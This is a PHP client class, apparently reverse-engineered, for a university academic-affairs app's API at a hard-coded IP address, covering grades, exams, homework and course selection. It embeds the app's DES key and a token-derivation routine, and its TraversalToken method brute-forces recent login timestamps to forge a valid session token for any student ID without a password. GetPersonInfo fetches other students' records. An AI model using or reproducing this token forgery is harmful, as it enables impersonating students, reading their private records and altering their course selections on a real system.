<?php
/*
$jwt = new jiaowutong();
$data = rand(1000000, 9999999) . '|'.time() .'|o6_bmjrPTlm6_2sgVt7hMZOPfL2M';
$data = $data .'|' . substr(md5($data), 0,8);
var_dump($data);
var_dump($jwt->rw_encryptDES($data));
*/
class jiaowutong{
    private $BaseURL = 'http://59.77.134.232/fzuapp/';
    private $PyjhUrl = 'CourseHandler.ashx';
    private $LoginUrl = 'CourseHandler.ashx';
    private $HomeworkUrl = 'WorkHandler.ashx';
    private $BaishitongUrl = 'MessageHandler.ashx';
    private $EmptyClassroomUrl = 'CourseHandler.ashx';
    private $ExamUrl = 'ExamHandler.ashx';
    private $ScoresUrl = 'CourseHandler.ashx';
    private $GpaUrl = 'CourseHandler.ashx';
    private $SelectCourseUrl = 'CourseHandler.ashx';
    private $CourseTableUrl = 'CourseHandler.ashx';
    private $MsgSetUrl = 'MessageHandler.ashx';
    private $UserUrl = 'UserHandler.ashx';
    private $TeacherInfoUrl = 'UserHandler.ashx';
    private $JudgeTeacherUrl = 'UserHandler.ashx';
    private $JudgeListUrl = 'UserHandler.ashx';
    private $TokenValidateUrl = 'UserHandler.ashx';
    private $token, $xh, $dateStr;
    private $ch;
    public function GetTeacherInfo($zgh){//政工号
        $url = $this->BaseURL . $this->TeacherInfoUrl;
        $r = $this->Post($url, array(
            'methodType' => 'teacherInfo',
            'zgh' => $zgh,
            'token' => $this->token
        ));
        return $r;
    }

    public function GetSelfInfo(){//获取自己的信息
        $url = $this->BaseURL . $this->UserUrl;
        $r = $this->Post($url, array(
            'methodType' => 'stuInfo',
            'xh' => $this->xh,
            'token' => $this->token
        ));
        return $r;
    }
    public function GetPersonInfo($xh){//任意信息获取 虽然没多少东西
        $url = $this->BaseURL . $this->UserUrl;
        $r = $this->Post($url, array(
            'methodType' => 'stuInfo',
            'xh' => $xh,
            'token' => $this->token
        ));
        return $r;
    }
    public function GetJudgeList(){//获取评议列表
        $url = $this->BaseURL . $this->JudgeListUrl;
        $r = $this->Post($url, array(
            'methodType' => 'evaluationList',
            'token' => $this->token
        ));
        return $r;
    }

    public function GetTokenValidate($version = '1.2.2', $tag = 'android'){//apk相关 没啥用
        $url = $this->BaseURL . $this->TokenValidateUrl;
        $r = $this->Post($url, array(
            'methodType' => 'validate',
            'token' => $this->token,
            'version' => $version,
            'tag' => $tag
        ));
        return $r;

    }

    public function JudgeTeacher($kkxq, $xsxm, $zgh, $lsxm, $kkhm, $bj, $kcdm, $score, $suggest, $radio01, $radio02, $radio03, $radio04){//教师评议 未测试
        $url = $this->BaseURL . $this->JudgeTeacherUrl;
        $r = $this->Post($url, array(
            'methodType' => 'judge',
            'kkxq' => $kkxq,
            'xsxm' => $xsxm,
            'zgh' => $zgh,
            'lsxm' => $lsxm,
            'kkhm' => $kkhm,
            'bj' => $bj,
            'kcdm' => $kcdm,
            'score' => $score,
            'suggest' => $suggest,
            'radio01' => $radio01,
            'radio02' => $radio02,
            'radio03' => $radio03,
            'radio04' => $radio04,
            'token' => $this->token
        ));
        return $r;
    }


    public function GetNotice(){//教务通apk的消息 没啥用
        $url = $this->BaseURL . $this->MsgSetUrl;
        $r = $this->Post($url, array(
            'methodType' => 'received',
            'token' => $this->token
        ));
        return $r;
    }
    public function GetMessage($datetime = "", $type = 0, $page = 100){//开始时间, 类型(0.校务, 1.教务通) , 获取条数
        $url = $this->BaseURL . $this->MsgSetUrl;
        $r = $this->Post($url, array(
            'methodType' => 'lastest',
            'token' => $this->token,
            'datetime' => $datetime,
            'type' => $type,
            'page' => $page
        ));
        return $r;
    }

    public function GetMsgSet($msgType, $operator){//没看懂
        $url = $this->BaseURL . $this->MsgSetUrl;
        $r = $this->Post($url, array(
            'methodType' => 'pushsetting',
            'token' => $this->token,
            'messageType' => $msgType,//JW KC?
            'operator' => $operator//open, close
        ));
        return $r;
    }

    public function GetCourseTable($kkxq){//选课
        //$data为json数组 未测试
        $url = $this->BaseURL . $this->CourseTableUrl;
        $r = $this->Post($url, array(
            'methodType' => 'table',
            'token' => $this->token,
            'kkxq' => $kkxq
        ));
        return $r;
    }

    public function ChooseCourseSelect($kkxq, $data){//选课
        //$data为json数组 未测试
        $url = $this->BaseURL . $this->SelectCourseUrl;
        $r = $this->Post($url, array(
            'methodType' => 'choose',
            'token' => $this->token,
            'kkxq' => $kkxq,
            'data' => $data
        ));
        return $r;
    }
    public function DropCourseSelect($xnxq, $kkhm, $kkjhid){//取消选课
        //没有测试过
        //学年学期? 开课号码, 开课计划id
        $url = $this->BaseURL . $this->SelectCourseUrl;
        $r = $this->Post($url, array(
            'methodType' => 'cancel',
            'token' => $this->token,
            'xnxq' => $xnxq,
            'kkhm' => $kkhm,
            'kkjhid' => $kkjhid
        ));
        return $r;
    }

    public function GetCourseSelect($kkxq){//获取选课信息
        $url = $this->BaseURL . $this->SelectCourseUrl;
        $r = $this->Post($url, array(
            'methodType' => 'chooseList_soap',
            'token' => $this->token,
            'kkxq' => $kkxq
        ));
        return $r;
    }

    public function GetGPA($kkxq){//获取GPA
        $url = $this->BaseURL . $this->GpaUrl;
        $r = $this->Post($url, array(
            'methodType' => 'GPA',
            'token' => $this->token,
            'kkxq' => $kkxq
        ));
        return $r;
    }
    public function GetCourseScore(){//获取成绩信息
    $url = $this->BaseURL . $this->ScoresUrl;
    $r = $this->Post($url, array(
        'methodType' => 'allcourse',
        'token' => $this->token,
    ));
    return $r;
    }

    public function GetCourseExam($kkxq){//学期考试安排
        //$kkxq为空都可以?= =
        $url = $this->BaseURL . $this->ExamUrl;
        $r = $this->Post($url, array(
            'methodType' => 'stuExam',
            'token' => $this->token,
            'kkxq' => $kkxq
        ));
        return $r;
    }
    public function ChangeHomeworkState($id, $process){//修改作业信息
        $url = $this->BaseURL . $this->HomeworkUrl;
        $r = $this->Post($url, array(
            'methodType' => 'stuwork_modify',
            'workID' => $id,
            'process' => $process,//remove to do finish
            'token' => $this->token,
        ));
        return $r;
    }
    public function GetCourseDetail(){//获取详细作业
        $url = $this->BaseURL . $this->HomeworkUrl;
        $r = $this->Post($url, array(
            'methodType' => 'mywork',
            'token' => $this->token,
        ));
        return $r;
    }

    public function GetEmptyRoom($xzrq = '',$qsj=1, $jxl='', $jslx=''){//空教室查询
        if($xzrq == ''){
            $xzrq = date('Y-m-d');
        }
        //var_dump($xzrq);
        $url = $this->BaseURL . $this->EmptyClassroomUrl;
        $r = $this->Post($url, array(
            'methodType' => 'emptyRoom',
            'token' => $this->token,
            'xzrq' => $xzrq,//选择日期
            'qsj' => $qsj,//起始节数
            'zzj' => intval($qsj) + 1,//终止节数
            'jslx' => $jslx,//教室类型{"多媒体", "非多媒体"}
            'jxl' => $jxl//教学楼{"", "公共教学楼西3", "公共教学楼西2", "公共教学楼西1", "公共教学楼中楼", "公共教学楼东1", "公共教学楼东2", "公共教学楼东3", "公共教学楼文科楼", "素拓中心", "田径场"}
        ));
        //容纳人数 考试人数
        return $r;
    }

    public function GetBaishitong($type = 'know'){//百事通
        $url = $this->BaseURL . $this->BaishitongUrl;
        $r = $this->Post($url, array(
            'methodType' => 'info',
            'token' => $this->token,
            'type' => $type
        ));
        return $r;
    }
    public function GetAcademic($nj, $zyh, $xyh){//获取培养计划
        $url = $this->BaseURL . $this->PyjhUrl;
        $r = $this->Post($url, array(
            'methodType' => 'education',
            'token' => $this->token,
            'nj' => $nj,
            'zyh' => $zyh,
            'xyh' => $xyh
        ));
        return $r;
    }
    public function GetHomework(){//获取详细作业
        $url = $this->BaseURL . $this->HomeworkUrl;
        $r = $this->Post($url, array(
            'methodType' => 'mywork',
            'token' => $this->token,
        ));
        return $r;
    }

    public function TraversalToken($xh, $startTime = '', $timeLong = 300){//穷举
        if($startTime == ''){
            $startTime = time();
        }
        set_time_limit(0);
        for ($i = 0; $i <= $timeLong; ++$i){
            $dateStr = date('YmdHis', $startTime - $i);
            $r = $this->TestToken($this->getToken($xh, $dateStr));
            if($r){
                return $r;
            }
        }
        return false;
    }
    public function TestToken($token){
        $url = $this->BaseURL . $this->BaishitongUrl;
        $r = $this->Post($url, array(
            'methodType' => 'info',
            'token' => $token,
            'type' => 'know'
        ));
        if($r && json_decode($r, true)['status'] == 0){
            return $token;
        }
        return false;
    }

    public function Login($xh, $pwd){
        $this->dateStr = date('YmdHis');
        $url = $this->BaseURL . $this->LoginUrl;
        $r = $this->Post($url, array(
            'xh' => $xh,
            'date' => $this->dateStr,
            'methodType' => 'stulogin',
            'machine' => '{"appVersionCode":4,"appVersionName":"1.2.2","osVersion":"6.0.1","phoneModel":"MI 5","sdkVersion":23}',
            'pwd' => $pwd,
            'connect' => ''
        ));
        //var_dump( $r);
        if (!$r || json_decode($r, true)['status'] != 0){
            return false;
        }
        $this->token = $this->getToken($xh, $this->dateStr);
        $this->xh = $xh;
        return $this->token;
    }
    public function GetXh($token = ''){
        if($token ==''){
            return $this->xh;
        }
        $str = $this->rw_decryptDES($token);
        if(preg_match('/(\d*)_(\d*)_(\d*)/', $str, $match)){
            return $match[1];
        }else{
            return 0;
        }
    }

    private function Post($url, $postArr){//发送POST请求
        $postData = array();
        foreach($postArr as $key => $value){
            array_push($postData, $key . "=" . urlencode($value));
        }
        curl_setopt_array($this->ch, array(
            CURLOPT_URL => $url,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => join($postData, "&")));

        //var_dump(join($postData, "&"));
        $result = curl_exec ($this->ch);
        $code = curl_getinfo($this->ch, CURLINFO_HTTP_CODE);
        if ($code != "200"){
            return false;
        }
        return $result;
    }
    private function getToken($xh, $dateStr){
        $token =  $xh . '_' .$dateStr . '_' . $this->rw_getSeed($xh, $dateStr);
        $token = $this->rw_encryptDES($token);
        return $token;
    }
    private function rw_encryptDES($encryptString){
        //mcrypt_encrypt在 php 7 废除, 升级看起来要重写加密
        $encryptKey = 'n&1P)J^A';//密钥
        //PKCS5Padding填充开始
        $block = mcrypt_get_block_size(MCRYPT_DES, MCRYPT_MODE_CBC);
        $padding = $block - (strlen($encryptString) % $block);
        $encryptString .= str_repeat(chr($padding),$padding);
        //PKCS5Padding填充结束
        return base64_encode(mcrypt_encrypt(MCRYPT_DES, $encryptKey, $encryptString, MCRYPT_MODE_CBC, $encryptKey));
    }
    private function rw_decryptDES($base64Data){
        //mcrypt_decrypt 在 php 7 废除, 升级看起来要重写加密
        $decryptKey = 'n&1P)J^A';//密钥
        $data = base64_decode($base64Data);
        $r = mcrypt_decrypt(MCRYPT_DES, $decryptKey, $data, MCRYPT_MODE_CBC, $decryptKey);
        return rtrim($r, substr($r ,-1));
    }

    private function rw_getSeed($xh, $date){
        $dataStr = array(
            substr($date, 0, 4), substr($date, 4, 2), substr($date, 6, 2),
            substr($date, 8, 2), substr($date, 10, 2), substr($date, 12, 2));
        $retStr = "";
        $i = 0;
        $m = (intval($xh) % 63) + 1;
        for(; $m > 0; $m >>= 1){
            if($m % 2 != 0){
                $retStr = $dataStr[$i] . $retStr;
            }
            $i++;
        }
        return $retStr;
    }
    public function __construct($token = '')
    {
        date_default_timezone_set('PRC');
        $this->ch = curl_init();
        curl_setopt_array($this->ch, array(
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_CONNECTTIMEOUT_MS => 1000,
            CURLOPT_USERAGENT => ''
        ));
        if ($token != ''){
            $this->token = $token;
            $str = $this->rw_decryptDES($token);
            if(preg_match('/(\d*)_(\d*)_(\d*)/', $str, $match)){
                 $this->xh = $match[1];
                 $this->dateStr = $match[2];
            }
        }
    }
}
